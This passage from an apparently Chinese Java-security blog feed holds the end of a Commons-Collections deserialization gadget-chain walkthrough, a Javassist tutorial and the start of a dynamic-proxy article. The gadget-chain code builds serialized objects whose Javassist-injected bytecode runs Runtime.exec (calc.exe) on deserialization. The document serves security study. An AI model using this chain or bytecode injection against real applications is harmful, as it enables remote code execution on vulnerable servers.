<span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过反射获取 PriorityQueue 对象中的 queue 数组,</span></span><br><span class="line"><span class="comment">         * 并将准备好的 TemplatesImpl 对象添加到这个 queue 数组中,</span></span><br><span class="line"><span class="comment">         * 以保证后续执行 InvokerTransformer.transform() 时成功调用 TemplatesImpl 对象中的 newTransformer() 方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl, <span class="number">1</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429003934416-602778476.png" alt="image-20220429003933584"></p><p>调用链</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220429010904215-2047324148.png" alt="image-20220429010903433"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/7k4dlQ9pI1X0Smhcb-HOgA">https://mp.weixin.qq.com/s/7k4dlQ9pI1X0Smhcb-HOgA</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13860621.html">https://www.cnblogs.com/nice0e3/p/13860621.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;之前分析了cc1的利用链，但是cc1的利用链是有JDK版本限制的。在JDK8u71版本以后，对&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;的&lt;code&gt;readobject&lt;/code&gt;进行了改写，导致高版本中利用链无法使用，这在上文中分析过了。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Javassist动态编程</title>
    <link href="https://kpa1on.github.io/2022/04/27/Java%E5%AE%89%E5%85%A8%E4%B9%8BJavassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/"/>
    <id>https://kpa1on.github.io/2022/04/27/Java%E5%AE%89%E5%85%A8%E4%B9%8BJavassist%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/</id>
    <published>2022-04-27T14:19:12.000Z</published>
    <updated>2022-04-27T16:04:36.247Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="动态编程"><a href="#动态编程" class="headerlink" title="动态编程"></a>动态编程</h3><p>动态编程是相对于静态编程而言的,平时我们讨论比较多的就是静态编程语言，例如Java，与动态编程语言，例如JavaScript。</p><span id="more"></span><p>那二者有什么明显的区别呢？简单的说就是在静态编程中，类型检查是在编译时完成的，而动态编程中类型检查是在运行时完成的。所谓动态编程就是绕过编译过程在运行时进行操作的技术，在Java中有如下几种方式：</p><p><strong>反射</strong><br>这个搞Java的应该比较熟悉，原理也就是通过在运行时获得类型信息然后做相应的操作。</p><p><strong>动态编译</strong><br>动态编译是从Java 6开始支持的，主要是通过一个JavaCompiler接口来完成的。通过这种方式我们可以直接编译一个已经存在的java文件，也可以在内存中动态生成Java代码，动态编译执行。</p><p><strong>调用JavaScript引擎</strong><br>Java 6加入了对Script(JSR223)的支持。这是一个脚本框架，提供了让脚本语言来访问Java内部的方法。你可以在运行的时候找到脚本引擎，然后调用这个引擎去执行脚本。这个脚本API允许你为脚本语言提供Java支持。</p><p><strong>动态生成字节码</strong></p><p>这种技术通过操作Java字节码的方式在JVM中生成新类或者对已经加载的类动态添加元素。</p><p>方式：</p><p><strong>ASM</strong>：直接操作字节码指令，执行效率高，要是使用者掌握Java类字节码文件格式及指令，对使用者的要求比较高。</p><p><strong>Javassit</strong> ：提供了更高级的API，执行效率相对较差，但无需掌握字节码指令的知识，对使用者要求较低。</p><h3 id="什么是Javassist"><a href="#什么是Javassist" class="headerlink" title="什么是Javassist"></a>什么是Javassist</h3><p><code>Javassist</code>是一个开源的分析、编辑和创建Java字节码的类库，Java 字节码存储在称为类文件的二进制文件中。每个类文件包含一个 Java 类或接口。是由东京工业大学的数学和计算机科学系的 Shigeru Chiba （千叶 滋）所创建的。其主要的优点，在于简单，而且快速。直接使用java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。而个人感觉在安全中最重要的就是在使用<code>Javassist</code>时我们可以像写Java代码一样直接插入Java代码片段，让我们不再需要关注Java底层的字节码的和栈操作，仅需要学会如何使用<code>Javassist</code>的API即可实现字节码编辑，类似于可以达到任意代码执行的效果。</p><h3 id="Javassist的使用"><a href="#Javassist的使用" class="headerlink" title="Javassist的使用"></a>Javassist的使用</h3><p>在<strong>Javassist</strong>中最为重要的是<code>ClassPool</code>，<code>CtClass</code> ，<code>CtMethod</code> 以及 <code>CtField</code>这几个类。</p><p>ClassPool：一个基于HashMap实现的CtClass对象容器，其中键是类名称，值是表示该类的CtClass对象。默认的ClassPool使用与底层JVM相同的类路径，因此在某些情况下，可能需要向ClassPool添加类路径或类字节。</p><p>CtClass：表示一个类，这些CtClass对象可以从ClassPool获得。</p><p>CtMethods：表示类中的方法。</p><p>CtFields ：表示类中的字段。</p><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ClassPool<span class="title function_">getDefault</span><span class="params">()</span>返回默认的类池。</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">insertClassPath</span><span class="params">(String pathname)</span>在搜索路径的开头插入目录或jar（或zip）文件。</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">insertClassPath</span><span class="params">(ClassPath cp)</span>ClassPath在搜索路径的开头插入一个对象。</span><br><span class="line">  </span><br><span class="line">java.lang.ClassLoader<span class="title function_">getClassLoader</span><span class="params">()</span>获取类加载器</span><br><span class="line">  </span><br><span class="line">CtClass<span class="title function_">get</span><span class="params">(java.lang.String classname)</span>从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。</span><br><span class="line">  </span><br><span class="line">ClassPath<span class="title function_">appendClassPath</span><span class="params">(ClassPath cp)</span> 将ClassPath对象附加到搜索路径的末尾。</span><br><span class="line">  </span><br><span class="line">CtClass<span class="title function_">makeClass</span><span class="params">(java.lang.String classname)</span>  创建一个新的<span class="keyword">public</span>类</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">setSuperclass</span><span class="params">(CtClass clazz)</span>更改超类，除非此对象表示接口。</span><br><span class="line"></span><br><span class="line">java.lang.Class&lt;?&gt;toClass(java.lang.invoke.MethodHandles.Lookup lookup)</span><br><span class="line">将此类转换为java.lang.Class对象。</span><br><span class="line"></span><br><span class="line"><span class="type">byte</span>[]toBytecode()将该类转换为类文件。</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span><span class="title function_">writeFile</span><span class="params">()</span>将由此CtClass 对象表示的类文件写入当前目录。</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span><span class="title function_">writeFile</span><span class="params">(java.lang.String directoryName)</span> 将由此CtClass 对象表示的类文件写入本地磁盘。</span><br><span class="line"></span><br><span class="line">CtConstructor<span class="title function_">makeClassInitializer</span><span class="params">()</span>制作一个空的类初始化程序（静态构造函数）。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">insertBefore</span> <span class="params">(java.lang.String src)</span></span><br><span class="line">在正文的开头插入字节码。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">insertAfter</span><span class="params">(java.lang.String src)</span></span><br><span class="line">在正文的末尾插入字节码。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span> <span class="params">(CtMethod src, ClassMap map)</span></span><br><span class="line">从另一个方法复制方法体。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span><span class="params">(java.lang.String src)</span></span><br><span class="line">设置构造函数主体。</span><br><span class="line"><span class="keyword">void</span><span class="title function_">setBody</span><span class="params">(CtConstructor src, ClassMap map)</span></span><br><span class="line">从另一个构造函数复制一个构造函数主体。</span><br><span class="line">CtMethod<span class="title function_">toMethod</span><span class="params">(java.lang.String name, CtClass declaring)</span></span><br><span class="line">复制此构造函数并将其转换为方法。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CtField"><a href="#CtField" class="headerlink" title="CtField"></a>CtField</h4><p>CtFields ：表示类中的字段。</p><h4 id="动态生成类"><a href="#动态生成类" class="headerlink" title="动态生成类"></a>动态生成类</h4><p>大致有如下几个步骤</p><ol><li>获取默认类池<code>ClassPool classPool = ClassPool.getDefault();</code></li><li>创建一个自定义类<code>CtClass ctClass = classPool.makeClass();</code></li><li>添加实现接口or属性or构造方法or普通方法</li></ol><ul><li><p>添加接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctClass.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.makeInterface(<span class="string">&quot;java.io.Serializable&quot;</span>)&#125;);</span><br></pre></td></tr></table></figure></li><li><p>添加属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//新建一个int类型名为id的成员变量</span></span><br><span class="line"><span class="type">CtField</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;id&quot;</span>, ctClass);</span><br><span class="line"><span class="comment">//将id设置为public</span></span><br><span class="line">id.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line"><span class="comment">//将该id属性&quot;赋值&quot;给ClassDemo</span></span><br><span class="line">ctClass.addField(id);</span><br></pre></td></tr></table></figure></li><li><p>添加构造方法(有参)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加有参构造方法</span></span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo(int id)&#123;this.id = id;&#125;&quot;</span>, ctClass);</span><br><span class="line">ctClass.addConstructor(ctConstructor1);</span><br></pre></td></tr></table></figure></li><li><p>添加方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcDemo()&#123;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">ctClass.addMethod(ctMethod);</span><br></pre></td></tr></table></figure></li></ul><ol start="4"><li><p>写入磁盘</p><p>这里写入磁盘可以用如下两种方法</p><ul><li>javassist自带的<code>ctClass.writeFile();</code>可指定绝对路径写入</li><li>也可转换为byte流通过<code>FileOutputStream</code>等写入磁盘</li></ul></li><li><p>进行验证：调用方法or属性赋值</p></li><li><p>tips：</p><ul><li>这里注意<code>javassist.CannotCompileException</code>异常: 因为同个 Class 是不能在同个 ClassLoader 中加载两次的，所以在输出 CtClass 的时候需要注意下,可以使用<code>javassist</code>自带的classloader解决此问题</li><li>反射时<code>newInstance()</code>抛出了<code>java.lang.InstantiationException</code>异常可能是因为没有写无参构造</li><li>如果已经加载了通过javassist生成的类，即便是通过反射(如<code>class.forName()</code>)或者<code>new</code>都不是加载一个<code>&quot;新类&quot;</code>，只有换一个ClassLoader加载才会是生成一个<code>&quot;新类&quot;</code></li></ul></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javassist.bytecode.AccessFlag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JavassistDemo01</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavassistDemo01</span>();</span><br><span class="line">        a.makeClass0();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeClass0</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//获取默认类池</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//创建一个类ClassDemo</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;com.sec.test2.ClassDemo&quot;</span>);</span><br><span class="line">        <span class="comment">//让该类实现序列化接口</span></span><br><span class="line">        ctClass.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.makeInterface(<span class="string">&quot;java.io.Serializable&quot;</span>)&#125;);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//新建一个int类型名为id的成员变量</span></span><br><span class="line">            <span class="type">CtField</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;id&quot;</span>, ctClass);</span><br><span class="line">            <span class="comment">//将id设置为public</span></span><br><span class="line">            id.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line">            <span class="comment">//将该id属性&quot;赋值&quot;给ClassDemo</span></span><br><span class="line">            ctClass.addField(id);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加无参构造方法</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo()&#123;&#125;;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(ctConstructor);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加有参构造方法</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public ClassDemo(int id)&#123;this.id = id;&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(ctConstructor1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加普通方法1</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcDemo()&#123;java.lang.Runtime.getRuntime().exec(\&quot;cmd.exe /c calc.exe\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//添加普通方法2</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod1</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void hello()&#123;System.out.println(\&quot;Hello Javassist!!!\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(ctMethod1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将class文件写入磁盘</span></span><br><span class="line">            <span class="comment">//转换成字节流</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            <span class="comment">//写入磁盘</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">classPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;user.dir&quot;</span>), <span class="string">&quot;/src/main/java/com/sec/test2&quot;</span>), <span class="string">&quot;ClassDemo.class&quot;</span>);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(classPath);</span><br><span class="line">            fos.write(bytes);</span><br><span class="line">            fos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//验证-调用方法</span></span><br><span class="line">            <span class="comment">//注意这里可能会抛javassist.CannotCompileException异常因为同个 Class 是不能在同个 ClassLoader 中加载两次的，所以在输出 CtClass 的时候需要注意下</span></span><br><span class="line">            <span class="comment">//需要通过一个未加载该class的classloader加载即可，为此javassist内置了一个classloader</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取javassist的classloader</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(classPool);</span><br><span class="line">            System.out.println(<span class="string">&quot;loading&quot;</span>);</span><br><span class="line">            <span class="comment">//通过该classloader加载才是新的一个class</span></span><br><span class="line">            Class&lt;?&gt; clazz = loader.loadClass(<span class="string">&quot;com.sec.test2.ClassDemo&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射调用hello</span></span><br><span class="line">            clazz.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>).invoke(clazz.newInstance());</span><br><span class="line">            <span class="comment">//反射调用calc</span></span><br><span class="line">            clazz.getDeclaredMethod(<span class="string">&quot;calcDemo&quot;</span>).invoke(clazz.newInstance());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="动态获取类方法"><a href="#动态获取类方法" class="headerlink" title="动态获取类方法"></a>动态获取类方法</h4><ol><li>获取默认类池<code>ClassPool classPool = ClassPool.getDefault();</code></li><li>获取目标类<code>CtClass cc = cp.get();</code></li><li>获取类的方法<code>CtMethod m = cc.getDeclaredMethod();</code></li><li>插入任意代码<code>m.insertBefore(&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&#125;&quot;);</code></li><li>转换为class对象<code>Class c = cc.toClass();</code></li><li>反射调用对象<code>JavassistDemo j= (JavassistDemo)c.newInstance();</code></li><li>执行方法<code>j.hello();</code></li></ol><p>tips：</p><ol><li>如果目标类未加载过，可以直接调用<code>toClass()</code>方法之后<code>new</code>一个该类的对象即可调用该类。</li><li>如果目标类已加载过，就需要用上面的方法，通过javassist的ClassLoader去加载后进行调用。</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/CoLo/p/15383642.html">https://www.cnblogs.com/CoLo/p/15383642.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;动态编程&quot;&gt;&lt;a href=&quot;#动态编程&quot; class=&quot;headerlink&quot; title=&quot;动态编程&quot;&gt;&lt;/a&gt;动态编程&lt;/h3&gt;&lt;p&gt;动态编程是相对于静态编程而言的,平时我们讨论比较多的就是静态编程语言，例如Java，与动态编程语言，例如JavaScript。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="动态编程" scheme="https://kpa1on.github.io/tags/%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Java动态代理</title>
    <link href="https://kpa1on.github.io/2022/04/25/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <id>https://kpa1on.github.io/2022/04/25/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</id>
    <published>2022-04-25T03:17:12.000Z</published>
    <updated>2022-04-26T05:00:15.721Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><p>为其他对象提供一个代理以控制对某个对象的访问。代理类主要负责为委托了（真实对象）预处理消息、过滤消息、传递消息给委托类，代理类不现实具体服务，而是利用委托类来完成服务，并将执行结果封装处理。</p><span id="more"></span><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>创建一个接口，然后创建被代理的类实现该接口并且实现该接口中的抽象方法。之后再创建一个代理类，同时使其也实现这个接口。在代理类中持有一个被代理对象的引用，而后在代理类方法中调用该对象的方法。</p><p>接口：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">HelloInterface</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHello</span>()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>被代理类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello proxy!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代理类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 